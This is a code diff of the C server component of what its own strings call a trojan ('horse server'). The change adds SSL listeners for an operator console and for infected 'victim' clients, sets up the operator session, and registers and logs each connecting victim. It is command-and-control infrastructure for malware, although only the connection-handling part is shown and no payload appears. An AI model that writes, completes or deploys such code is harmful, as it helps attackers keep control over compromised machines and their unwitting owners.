@@ -2,54 +2,97 @@
 // Created by cmtheit on 23-5-26.
 //
 
-
 #include "server.h"
 #include "../util/printlog.h"
+#include "session.h"
+#include "victim.h"
 #include <pthread.h>
 #include <event2/event.h>
 #include <hv/hloop.h>
 #include <unistd.h>
 
 Server server;
-Session session;
 
 // 为主控端提供服务
-void server_m_on_accept(hio_t * hio) {
-    static const char * welcome_msg = "Welcome to the horse server, your server is right for you.\n";
-    size_t welcome_msg_len = strlen(welcome_msg);
-    size_t sent = hio_write(hio, welcome_msg, welcome_msg_len);
-    if (sent != welcome_msg_len) {
-
+void server_m_on_accept(hio_t * io) {
+    event2_print_log(EVENT_LOG_MSG, "-> 主控端请求");
+    SessionEstablishResult ser = session_establish(io);
+    if (result_is_err(ser)) {
+        switch (result_unwrap(ser)) {
+            case SessionEstablishErrOccupied:
+                event2_print_log(EVENT_LOG_WARN, "已存在另一个尝试或已经建立的会话.");
+                break;
+            case SessionEstablishErrOther:
+            default:
+                event2_print_log(EVENT_LOG_WARN, "会话建立" FAILED ".");
+                break;
+        }
     }
-    hio_close(hio);
 }
 
 // 为受控端提供服务
-void server_e_on_accept(hio_t * hio) {
-
+void server_e_on_accept(hio_t * io) {
+    event2_print_log(EVENT_LOG_MSG, "受害者程序运行");
+    VictimsAddResult add_result = victims_add(io);
+    if (result_is_err(add_result)) {
+        hio_close(io);
+        switch (result_unwrap(add_result)) {
+            case VictimsAddErrOther:
+            default:
+                event2_print_log(EVENT_LOG_ERR, "添加受害者失败");
+                break;
+        }
+    } else {
+        print_logl("受害者 " CHALK_YELLOW("%d") " 添加", result_unwrap(add_result));
+    }
 }
 
-void server_init() {
+ServerInitResult server_init() {
+    ServerInitResult res = result_new_ok(0);
     server.m.port = config.mport;
     server.m.hloop = hloop_new(0);
-    hloop_create_ssl_server(server.m.hloop, "0.0.0.0", server.m.port, server_m_on_accept);
+
+    hssl_ctx_opt_t ssl_param;
+    memset(&ssl_param, 0, sizeof(ssl_param));
+    ssl_param.crt_file = "cert/server.crt";
+    ssl_param.key_file = "cert/server.key";
+    ssl_param.endpoint = HSSL_SERVER;
+
+    hio_t * mio = hloop_create_ssl_server(server.m.hloop, "127.0.0.1", server.m.port, server_m_on_accept);
+    if (!mio) {
+        result_turn_err(res, ServerInitErrSSLServerCreate);
+        return res;
+    } else {
+        server.m.io = mio;
+    }
+    if (hio_new_ssl_ctx(mio, &ssl_param) != 0) {
+        result_turn_err(res, ServerInitErrSSLCtx);
+        return res;
+    }
     server.e.port = config.eport;
     server.e.hloop = hloop_new(0);
-    hloop_create_ssl_server(server.e.hloop, "0.0.0.0", server.m.port, server_e_on_accept);
-
-    pthread_mutex_init(&session.lock, NULL);    // session lock
-    session_id_t none_id = option_new_none();
-    session.id = none_id;   // set session id to none
+    hio_t * eio = hloop_create_ssl_server(server.e.hloop, "127.0.0.1", server.e.port, server_e_on_accept);
+    if (!eio) {
+        result_turn_err(res, ServerInitErrSSLServerCreate);
+        return res;
+    } else {
+        server.e.io = eio;
+    }
+    if (hio_new_ssl_ctx(eio, &ssl_param) != 0) {
+        result_turn_err(res, ServerInitErrSSLCtx);
+        return res;
+    }
+    return res;
 }
 
 
 static void * server_mptherad_routine(void *) {
-    event2_print_log(EVENT_LOG_MSG, "Controller side server start...");
+    event2_print_log(EVENT_LOG_MSG, "主控端服务器启动...");
     hloop_run(server.m.hloop);
 }
 
 static void * server_cpthread_routine(void *) {
-    event2_print_log(EVENT_LOG_MSG, "Controllee side server start...");
+    event2_print_log(EVENT_LOG_MSG, "受控端服务器启动...");
     hloop_run(server.e.hloop);
 }
 
@@ -61,13 +104,17 @@ void server_start() {
 
 void server_quit() {
     // 停止服务器循环，停止服务器线程
+    print_logl("停止主控端服务器...");
     hloop_stop(server.m.hloop);
     pthread_join(server.m.pthread, NULL);
     hloop_free(&server.m.hloop);
+    print_logl("主控端服务器停止 " SUCCESSFULLY ".");
 
+    print_logl("停止受控端服务器...");
     hloop_stop(server.e.hloop);
     pthread_join(server.e.pthread, NULL);
     hloop_free(&server.e.hloop);
+    print_logl("受控端服务器终止 " SUCCESSFULLY  ".");
 
     // 释放 session
     pthread_mutex_lock(&session.lock);
